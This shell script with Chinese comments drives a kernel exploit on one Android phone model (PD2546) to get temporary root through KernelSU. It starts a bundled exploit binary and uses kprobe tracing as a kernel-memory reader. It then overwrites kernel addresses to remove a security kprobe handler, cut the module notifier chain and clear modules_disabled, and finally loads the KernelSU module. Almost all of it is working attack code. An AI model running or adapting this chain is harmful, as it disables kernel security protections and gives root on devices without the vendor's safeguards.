#!/system/bin/sh
# PD2546 临时 KernelSU root —— 设备本机版
# 用法（目标机上，通过 Shizuku 的 rish 拿到 uid=2000 shell）：
#   rish
#   sh /data/local/tmp/reroot-local.sh
#
# 与 adb 版的差别：重启会把这个脚本本身一起杀掉，所以 exploit parked 时
# 必须你手动重启后再跑一次，没法像电脑那样自动重试 8 轮。

D=${PD_D:-/data/local/tmp}
CH="$D/chan"
LOG="$D/fakeR.log"
HERE=$(dirname "$0")
SRC=${PD_SRC:-}
if [ -z "$SRC" ]; then
  for _c in /sdcard/Download/pd2546/files "$HERE/files"; do
    [ -d "$_c" ] && { SRC=$_c; break; }
  done
fi
[ -n "$SRC" ] || SRC=/sdcard/Download/pd2546/files

IMAGE_BASE=ffffffc080000000
KPROBE_TABLE=ffffffc08279f6e8
LOAD_MODULE=ffffffc080502688
MODULE_NOTIFY_LIST=ffffffc0825d7d28
TRACE_MODULE_NOTIFY=ffffffc08057d2a4
TRACE_SYS_EXIT=ffffffc0826d93e0

# 所有 say 的东西同时攒一份到 $RUNLOG：App 端日志浮层要是没弹出来，
# 事后用「拉取设备端状态」或 adb 直接 cat 这个文件就能看到跑到了哪一步。
SU_BIN=""
for _p in /data/adb/ksu/bin/su /debug_ramdisk/su su; do
  command -v "$_p" >/dev/null 2>&1 && { SU_BIN=$_p; break; }
done
RUNLOG="$D/run.log"
# 每行直接追加落盘（不是退出时才写）：plant 阶段真要 panic 重启，
# 重启后也能看到日志最后停在哪一行。
say() { printf '%s\n' "$*" >> "$RUNLOG" 2>/dev/null; echo "$*"; }
dump_log() { :; }
mark() { echo "$1" > /data/local/tmp/.pd_step 2>/dev/null; }
MARK=''
die() { say "[X] $*"; exit 2; }

# ---------- 64 位地址运算 ----------
# 踩过的坑：Android 的 mksh 用 32 位整数做 $(( ))，$((0x80000000)) 直接是负数，
# 16 位内核地址一参与运算就溢出，进位循环永远退不出来 —— 表现就是日志停在
# READY slide=… 之后再无输出。所以这里一点 shell 算术都不做，全部交给 awk：
# awk 里也只用字符 + 每段 16 以内的加法，不碰浮点（double 撑不住 48 位地址）。
HEXADD='
function hv(c){ return index("0123456789abcdef", tolower(c)) - 1 }
function hd(n){ return substr("0123456789abcdef", n + 1, 1) }
function add(a, b,   i, c, d, o) {
  while (length(a) < length(b)) a = "0" a
  while (length(b) < length(a)) b = "0" b
  c = 0; o = ""
  for (i = length(a); i > 0; i--) {
    d = hv(substr(a, i, 1)) + hv(substr(b, i, 1)) + c
    c = int(d / 16)
    o = hd(d % 16) o
  }
  if (c > 0) o = "1" o
  return o
}'

hexadd() { # $1 $2 都是纯 hex 串（可不等长） -> HOUT
  _r=$(awk -v a="$1" -v b="$2" "$HEXADD"'
BEGIN { printf "%s", add(a, b) }')
  [ -n "$_r" ] || { say "[X] 地址运算失败：$1 + $2"; exit 2; }
  HOUT=$_r
}
hadd() { hexadd "$1" "$2"; }
hlt() { # $1 < $2 ?（等长 hex 串直接按字典序比）
  [ "${#1}" -lt "${#2}" ] && return 0
  [ "${#1}" -gt "${#2}" ] && return 1
  [ "$1" \< "$2" ]
}
hexoff() { # 十进制小整数 -> 8 位 hex，放 HOUT
  _d=$1
  [ "$_d" -lt 0 ] && _d=0
  _h=''
  _i=8
  while [ $_i -gt 0 ]; do
    _h="$(printf '%x' $((_d % 16)))$_h"
    _d=$((_d / 16))
    _i=$((_i - 1))
  done
  HOUT=$_h
}

# ---------- chan 通道 ----------
write_run() { # stdin -> chan/run（先写 .new 再 rename，避免 dispatcher 读到半截）
  cat > "$CH/run.new"
  mv -f "$CH/run.new" "$CH/run"
}

kread() { # 地址... -> KV0 KV1 ...（hex，不带 0x；读不到为空）
  _n=$#; _i=0; _args=''
  for _a in "$@"; do _args="$_args a$_i=@0x$_a"; _i=$((_i + 1)); done
  KRCNT=$((KRCNT + 1)); _ev="kr$$_$KRCNT"; _dm="__KR_${_ev}__"
  _i=0
  while [ $_i -lt $_n ]; do eval "KV$_i=''"; _i=$((_i + 1)); done
  {
    echo 'cd /sys/kernel/tracing'
    echo 'echo 0 > events/enable'
    echo 'echo > kprobe_events'
    echo "echo 'p:$_ev capable$_args' >> kprobe_events"
    echo 'echo 1 > events/kprobes/enable 2>&1'
    echo 'echo 1 > tracing_on'
    echo 'echo > trace'
    echo "$D/probe > /dev/null 2>&1"
    echo '/system/bin/usleep 1000000'
    echo 'echo 0 > tracing_on'
    echo "grep '$_ev:' trace | tail -1"
    echo 'echo 0 > events/kprobes/enable 2>/dev/null'
    echo "echo $_dm"
  } | write_run
  _w=0
  while [ $_w -lt 40 ]; do
    sleep 2; _w=$((_w + 1))
    grep -aq "$_dm" "$LOG" && break
    case $_w in
      5|10|15|20|25) say "    ...等 kread 回读 $((_w * 2)) 秒" ;;
    esac
  done
  _line=$(grep -a "$_ev:" "$LOG" | tail -1)
  [ -n "$_line" ] || return 1
  for _t in $_line; do
    case "$_t" in
      a[0-9]*=0x*) _k=${_t%%=*}; _k=${_k#a}; eval "KV$_k=\${_t#*=0x}" ;;
    esac
  done
  return 0
}

plant() { # $1=地址 $2=模式(默认0)
  _addr=$1; _mode=${2:-0}; _p=0
  while [ $_p -lt 3 ]; do
    _p=$((_p + 1))
    rm -f "$CH/plant_res" "$CH/plant_done"
    printf '%s %s\n' "$_addr" "$_mode" > "$CH/plant_req"
    _w=0
    while [ $_w -lt 30 ]; do
      sleep 2; _w=$((_w + 1))
      [ -s "$CH/plant_res" ] && break
      case $_w in
        3|6|9|12) say "    ...等 plant_res $((_w * 2)) 秒（addr=$_addr）" ;;
      esac
    done
    _res=$(cat "$CH/plant_res" 2>/dev/null)
    say "  [plant] 0x$_addr #$_p -> ${_res:-timeout}"
    case "$_res" in 1*) return 0 ;; esac
  done
  say "  [X] plant 三次都没回执：plant server 没在消费 chan/plant_req，"
  say "      或 fakeR.log 里还没有 [fake] dispatcher ready"
  return 1
}

zero_check() { # $1=标签
  case "${KV0:-}" in ''|0) return 0 ;; esac
  die "$1 没清掉（读到 $KV0）"
}

# ---------- 0. 环境 ----------
rm -f "$RUNLOG"
mark "start"
say "== PD2546 设备端重 root · $(date '+%m-%d %H:%M:%S' 2>/dev/null) =="
say "  App 端日志浮层看不到东西时，跑完到这里 cat $RUNLOG"
say "[1/7] 环境检查"
say "  id=$(id)"
[ "$(id -u)" = "2000" ] || say "[!] 不是 uid=2000，请确认在 rish 里运行"

# PD_PKG：管理器包名（App 里选的根管理器），PD_KMI：late-load 的 KMI 串
PKG=${PD_PKG:-me.weishu.kernelsu}
KMI=${PD_KMI:-android16-6.12}

KEXP='6.12.58-android16-6-gdd6fd5c98918'
KV=$(uname -r)
say "  kernel=$KV"
say "  modules_disabled=$(cat /proc/sys/kernel/modules_disabled 2>/dev/null || echo '?')"
say "  lsm=[$(cat /sys/kernel/security/lsm 2>/dev/null || echo '?')]"
say "  /sys/kernel/security: $(ls /sys/kernel/security 2>/dev/null | tr '\n' ' ')"
case "$KV" in
  *"$KEXP"*) ;;
  *)
    say "[!] 内核 $KV 与包内常量（$KEXP）不一致。"
    say "    地址/符号全按那个 build 推导，错 build 写下去不是 root 是 panic。"
    [ "${FORCE:-0}" = "1" ] || die "确认要硬来: FORCE=1 sh $0"
    say "[!] FORCE=1，继续但风险自负"
    ;;
esac

for f in timer98260 ksud probe fake_shell.sh ksu_stage.sh ksu.ko symbols.txt; do
  if [ ! -f "$D/$f" ]; then
    [ -f "$SRC/$f" ] || die "缺少 $SRC/$f（先把解压出来的 linux/files 放到 /sdcard/Download/pd2546/）"
    cp -f "$SRC/$f" "$D/$f" || die "拷贝 $f 失败"
  fi
done
chmod 755 "$D/timer98260" "$D/ksud" "$D/probe" "$D/fake_shell.sh" "$D/ksu_stage.sh"
say "  设备上实际的文件："
for f in timer98260 ksud probe fake_shell.sh ksu_stage.sh ksu.ko symbols.txt; do
  say "    $f  $(wc -c < "$D/$f" 2>/dev/null | tr -d ' ') 字节"
done
mkdir -p "$CH"; chmod 777 "$CH"
printf 1 > "$CH/kptr_0000"; chmod 666 "$CH/kptr_0000"
rm -f "$CH/plant_req" "$CH/plant_done" "$CH/plant_res" "$CH/run" "$CH/run.new" "$CH/busy"

REUSE=0
if ps -A -o PID,NAME 2>/dev/null | grep -q '[t]imer98260'; then
  if grep -aq 'plant server ready' "$LOG" 2>/dev/null; then
    REUSE=1
    say "[i] 检测到 plant server 仍在运行，复用现有实例（跳过部署/启动）。"
  else
    say "[X] 已有 timer98260 在跑，但 fakeR.log 里没有 plant server ready。"
    say "    上一轮跑到一半挂了，内核状态是脏的 —— 先重启手机，再点一次。"
    say "---- fakeR.log 最后 12 行 ----"
    tail -n 12 "$LOG" 2>/dev/null > "$D/.pd_tail"
    while IFS= read -r _l; do say "  $_l"; done < "$D/.pd_tail"
    rm -f "$D/.pd_tail"
    dump_log
    exit 2
  fi
fi

# ---------- 1. 起 exploit ----------
if [ "$REUSE" = "1" ]; then
  say "[2/7] 跳过启动，直接用已经在跑的 exploit"
else
  say "[2/7] 启动 fake exploit（setsid 脱离当前 shell）"
  say "  注意：这一步起 timer98260 常驻，失败只能重启手机再来。"
  cd "$D" || die "进不去 $D"
  rm -f "$LOG"
  setsid sh -c 'nohup ./timer98260 fake > fakeR.log 2>&1 < /dev/null &' 2>/dev/null \
    || { nohup ./timer98260 fake > fakeR.log 2>&1 < /dev/null & }
  say "  等待 plant server ready（最长 2.5 分钟）…"

  ready=0; parked=0; _w=0
  while [ $_w -lt 30 ]; do
    sleep 5; _w=$((_w + 1))
    if grep -aq 'plant server ready' "$LOG"; then ready=1; break; fi
    if grep -aq 'parking without reap' "$LOG"; then parked=1; break; fi
    case $_w in
      2|4|6|8|10|12|15|18|21|24|27)
        say "  ...已等 $((_w * 5)) 秒（fakeR.log $(wc -c < "$LOG" 2>/dev/null | tr -d ' ') 字节）" ;;
    esac
  done
  if [ "$ready" != "1" ]; then
    say "[X] exploit 没起来（parked=$parked）—— 这一轮不会成功。"
    say "---- fakeR.log 最后 15 行（这就是它卡住的原因）----"
    tail -n 15 "$LOG" 2>/dev/null > "$D/.pd_tail"
    while IFS= read -r _l; do say "  $_l"; done < "$D/.pd_tail"
    rm -f "$D/.pd_tail"
    say "---- 结束 ----"
    case "$parked" in
      1) say "[!] parking without reap：fake 页被僵尸占住，必须重启手机才干净。" ;;
      *) say "[!] 一行都没有 = 二进制根本没跑起来（权限/架构/tmp 挂载）；" ;
         say "    有几行停在 [cred]/[base] = fake 凭据那一步没打穿，先重启再试。" ;;
    esac
    dump_log
    exit 1
  fi
fi

SLIDE=$(grep -o 'slide=0x[0-9a-f]*' "$LOG" 2>/dev/null | tail -1 | sed 's/.*0x//')
[ -n "$SLIDE" ] || die "日志里没有 slide"
mark "ready-$SLIDE"
say "  READY slide=0x$SLIDE"

hadd "$IMAGE_BASE" "$SLIDE"; BASE="$HOUT"
hadd "$BASE" 03000000; LIMIT="$HOUT"

# ---------- 2. vr funcs ----------
say "[3/7] 清 vr funcs"
hadd "$TRACE_SYS_EXIT" "$SLIDE"
hadd "$HOUT" 48; VR="$HOUT"
say "  slide=0x$SLIDE base=0x$BASE"
say "  vr_funcs=0x$VR"
plant "$VR" 0 || die "VR PLANT FAILED"
kread "$VR"; zero_check "vr funcs"
say "  vr funcs after = ${KV0:-none}"

# ---------- 3. kprobe 聚合节点 / pre_handler ----------
say "[4/7] 扫 kprobe 桶，找聚合节点"
hadd "$LOAD_MODULE" "$SLIDE"; LM="$HOUT"
hadd "$KPROBE_TABLE" "$SLIDE"; TB="$HOUT"
say "  lm=$LM"

CANDS=''
_b=0
while [ $_b -lt 64 ]; do
  _addrs=''; _j=0
  while [ $_j -lt 16 ]; do
    hexoff $(( (_b + _j) * 8 )); hadd "$TB" "$HOUT"; _addrs="$_addrs $HOUT"
    _j=$((_j + 1))
  done
  kread $_addrs
  _j=0
  while [ $_j -lt 16 ]; do
    eval "_h=\${KV$_j:-}"
    case "$_h" in ffffff*) CANDS="$CANDS $_h" ;; esac
    _j=$((_j + 1))
  done
  _b=$((_b + 16))
done
say "  桶内有效指针 $(echo $CANDS | wc -w) 个"

AGGR=''
for _c in $CANDS; do
  hadd "$_c" 28; _ap="$HOUT"
  kread "$_ap"
  [ "${KV0:-}" = "$LM" ] && { AGGR=$_c; break; }
done
[ -n "$AGGR" ] || die "AGGR NOT FOUND（slide 或 KPROBE_TABLE 不对）"
say "  aggr=$AGGR"

hadd "$AGGR" 10; _head="$HOUT"
kread "$_head"; NODE=${KV0:-}
# 判据（手册 §7.2 实测三条规则）：
#   1. 桶头自身也要看，不能只遍历 list.next；
#   2. pre_handler 落在镜像窗口里也可能是目标 —— 别再按 base..base+0x3000000 过滤，
#      旧逻辑就是死在这里，日志表现为 PRE_HANDLER NOT FOUND；
#   3. 优先清 slab 地址（< 0xffffffc000000000）的节点，链条遍历上限 8 跳。
TARGET=''; TARGET_SLAB=0; _i=0
while [ $_i -lt 8 ] && [ -n "$NODE" ] && [ "$NODE" != "$_head" ]; do
  hadd "$NODE" 18; _an="$HOUT"
  hadd "$NODE" 30; _ap="$HOUT"
  kread "$NODE" "$_an" "$_ap"
  NN=${KV0:-}; _addr=${KV1:-}; _pre=${KV2:-}
  say "  node=$NODE addr=$_addr pre=$_pre"
  case "$_pre" in
    ''|0|ffffffffffffffff) ;;
    *)
      if [ "$_addr" = "$LM" ]; then
        if hlt "$NODE" ffffffc000000000; then
          TARGET=$_ap; TARGET_SLAB=1
        else
          [ -n "$TARGET" ] || TARGET=$_ap
        fi
      fi ;;
  esac
  [ "$TARGET_SLAB" = "1" ] && break
  NODE=$NN
  _i=$((_i + 1))
done
if [ -z "$TARGET" ]; then
  if [ "${TOLERANT:-0}" = "1" ]; then
    say "  [!] PRE_HANDLER NOT FOUND，TOLERANT=1 跳过（非 vivo 机型通常没有这个节点）"
  else
    die "PRE_HANDLER NOT FOUND（非 vivo 机型可试 TOLERANT=1）"
  fi
else
  plant "$TARGET" 0 || die "PRE PLANT FAILED"
  kread "$TARGET"; zero_check "pre_handler"
  say "  pre_handler after = ${KV0:-none}"
fi

# ---------- 4. notifier 链 ----------
say "[5/7] 截断 module notifier 链"
hadd "$MODULE_NOTIFY_LIST" "$SLIDE"; NH="$HOUT"
hadd "$NH" 40; kread "$HOUT"; NODE=${KV0:-}
say "  notifier head $NODE"
hadd "$TRACE_MODULE_NOTIFY" "$SLIDE"; WANT="$HOUT"
NT=''; _i=0
while [ $_i -lt 16 ] && [ -n "$NODE" ]; do
  hadd "$NODE" 08; _nn_a="$HOUT"
  hadd "$NODE" 10; _pr_a="$HOUT"
  kread "$NODE" "$_nn_a" "$_pr_a"
  CALL=${KV0:-}; NN=${KV1:-}
  say "  nb $NODE call=$CALL next=$NN"
  [ "$CALL" = "$WANT" ] && { NT=$_nn_a; break; }
  NODE=$NN
  _i=$((_i + 1))
done
if [ -z "$NT" ]; then
  if [ "${TOLERANT:-0}" = "1" ]; then
    say "  [!] TRACE_MODULE_NOTIFY NODE NOT FOUND，TOLERANT=1 跳过"
  else
    die "TRACE_MODULE_NOTIFY NODE NOT FOUND（可试 TOLERANT=1）"
  fi
else
  plant "$NT" 0 || die "NOTIFIER PLANT FAILED"
  kread "$NT"; zero_check "notifier"
  say "  notifier next after = ${KV0:-none}"
fi
say "  ALL PLANTS OK"

# ---------- 4.5 模块加载开关 ----------
_md=$(cat /proc/sys/kernel/modules_disabled 2>/dev/null)
say "== 模块加载开关 modules_disabled=${_md:-?} =="
if [ "$_md" = "1" ]; then
  say "  内核禁止加载模块（insmod 会 EPERM），用 plant 把 modules_disabled 清 0"
  hexadd ffffffc08279c278 "$SLIDE"
  mark "zero-modd-0x$HOUT"
  plant "$HOUT" 0 || die "清 modules_disabled 失败"
  kread "$HOUT"
  say "  modules_disabled after = ${KV0:-?}"
  case "${KV0:-}" in 0) mark "zero-modd-ok" ;; *) say "[X] 回读不是 0，地址可能不对，停在这里不继续"; die "modules_disabled 清零未验证" ;; esac
else
  say "  modules_disabled 不是 1。若稍后 insmod 仍 EPERM，则是 kernel lockdown。"
fi

# ---------- 5. kallsyms ----------
say "[6/7] 生成 kallsyms（128943 行，全部加 slide）"
awk -v s="$SLIDE" "$HEXADD"'
{ if (NF >= 3 && $1 ~ /^[0-9a-f]+$/) { $1 = add($1, s) } print }
' "$D/symbols.txt" > "$D/kall"
_kc=$(wc -l < "$D/kall" | tr -d ' ')
say "  KALLSYMS_OK $_kc 个符号"
[ "$_kc" = "128943" ] || say "  [!] 行数不是 128943，ksud 找符号会失败"

# ---------- 6. late-load ----------
mark "late-load"
say "[7/7] ksud late-load（install → late-load → 取证）"
# 这一段直接内联进 chan/run，不再依赖外部 ksu_stage.sh 文件
# （上一版设备上跑的仍是旧脚本，白丢一轮）。
write_run <<LOADEOF
echo ===LOAD===
echo "[ksu] stage v3.4 inline"
id
echo "[ksu] ---- 管理器 ----"
echo "[ksu] pkg=$PKG（fake root 里 pm/dumpsys 连不上 servicemanager，管理器版本由 App 侧打印）"
cat /sys/module/module/parameters/sig_enforce
mkdir -p /data/adb
cp $D/kall /data/adb/kall 2>/dev/null
chmod 644 /data/adb/kall 2>/dev/null
echo "[ksu] kall lines=\$(wc -l < /data/adb/kall 2>/dev/null)"
echo "[ksu] stage file: \$(ls -l $D/ksu_stage.sh 2>/dev/null)"
KSUD=$D/ksud
[ -x "\$KSUD" ] || KSUD=/data/adb/ksu/bin/ksud
echo "[ksu] ksud=\$KSUD size=\$(wc -c < \$KSUD 2>/dev/null)"
"\$KSUD" --version 2>&1 | head -1
"\$KSUD" install > $D/install.log 2>&1
echo "[ksu] install rc=\$?"
sed -n '1,20p' $D/install.log 2>/dev/null
"\$KSUD" late-load --kmi $KMI --allow-shell --package-name $PKG > $D/late.log 2>&1
echo "[ksu] late-load rc=\$?"
sed -n '1,40p' $D/late.log 2>/dev/null
if ! grep -q '^kernelsu ' /proc/modules; then
  "\$KSUD" late-load --allow-shell --package-name $PKG > $D/late2.log 2>&1
  echo "[ksu] late-load2 rc=\$?"
  sed -n '1,40p' $D/late2.log 2>/dev/null
fi
/system/bin/usleep 2000000
if grep -q '^kernelsu ' /proc/modules; then echo KSU_LOADED; else
  echo KSU_MISSING
  echo "[ksu] ---- /data/adb/ksu/log ----"
  ls -l /data/adb/ksu/log 2>&1 | head
  for f in /data/adb/ksu/log/*; do [ -f "\$f" ] && { echo "--- \$f ---"; tail -n 30 "\$f"; }; done
  echo "[ksu] ---- /data/adb/ksu 结构 ----"
  ls -l /data/adb/ksu 2>&1 | head -20
  echo "[ksu] ---- insmod $D/ksu.ko ----"
  insmod $D/ksu.ko 2>&1
  echo "[ksu] insmod rc=\$?"
  /system/bin/usleep 1000000
  grep -q '^kernelsu ' /proc/modules && echo KSU_LOADED || echo KSU_STILL_MISSING
fi
echo "[ksu] ---- logcat(ksu/insmod) ----"
logcat -d -t 400 2>/dev/null | grep -iE 'kernelsu|ksud|insmod|lkm|module' | tail -30
echo "[ksu] ---- lsm / securityfs ----"
cat /sys/kernel/security/lsm 2>&1
ls -l /sys/kernel/security 2>&1 | head -20
echo "[ksu] ---- ksud --help ----"
"\$KSUD" --help 2>&1 | head -40
echo "[ksu] ---- ksud insmod --help ----"
"\$KSUD" insmod --help 2>&1 | head -30
echo "[ksu] ---- try ksud insmod $D/ksu.ko ----"
"\$KSUD" insmod $D/ksu.ko 2>&1
echo "[ksu] ksud-insmod rc=\$?"
/system/bin/usleep 1000000
grep -q '^kernelsu ' /proc/modules && echo KSU_LOADED_VIA_INSMOD || echo KSU_STILL_MISSING
echo "[ksu] ---- dmesg: lockdown/lsm/bpf/hks ----"
dmesg 2>&1 | grep -iE 'lockdown|lsm|bpf|hks-dfd|security' | tail -30
echo "[ksu] ---- dmesg tail ----"
dmesg 2>&1 | tail -n 40
echo "[ksu] enforce=\$(getenforce)"
id
echo ===LOAD_END===
LOADEOF
_w=0
while [ $_w -lt 40 ]; do
  sleep 3; _w=$((_w + 1))
  grep -aq '===LOAD_END===' "$LOG" && break
  case $_w in
    3|6|9|12) say "  ...late-load 进行中（$((_w * 3)) 秒）" ;;
  esac
done
sleep 2

say ''
say "---- late-load 输出（来自设备端 fakeR.log，挑关键行）----"
awk '/===LOAD===/{f=1} f' "$LOG" 2>/dev/null > "$D/.pd_load"
say "  （设备端 LOAD 段共 $(wc -l < "$D/.pd_load" | tr -d ' ') 行）"
grep -aE '\[ksu\]|kernelsu|insmod|LATE_RC|KSU_|error|Error|failed|deny|denied|vermagi|invalid|reject' "$D/.pd_load" \
  | head -n 120 | while IFS= read -r _l; do say "  $_l"; done
rm -f "$D/.pd_load"
say "---- ----"

say ''
say "=== 验证 ==="
say "$(grep -a 'LATE_RC' "$LOG" | tail -1)"
say "$(grep -a 'KSU_LOADED\|KSU_MISSING\|\[ksu\] late-load' "$LOG" | tail -3)"
say "$(grep -a 'kernelsu' "$LOG" | tail -1)"
SUID=$("$SU_BIN" -c id 2>/dev/null | head -1)
[ -n "$SUID" ] || SUID=$(/data/adb/ksu/bin/su -c id 2>&1 | head -1)
OUT=$(grep kernelsu /proc/modules 2>/dev/null; echo "$SUID"; getenforce 2>/dev/null)
say "$OUT"
case "$OUT" in
  *kernelsu*u:r:ksu:s0*)
    say ''
    say '========================================'
    mark "DONE"
    say '  KSU_ROOT_OK  root 已就绪（u:r:ksu:s0）'
    say '========================================'
    dump_log
    exit 0 ;;
esac
say "[X] 验证没通过：内核里没有 kernelsu 模块。"
say "    跟管理器版本无关。看上面 dmesg / avc denied / insmod 那几行，"
say "    常见原因是 modules_disabled=1 或 kernel lockdown。"
dump_log
exit 1
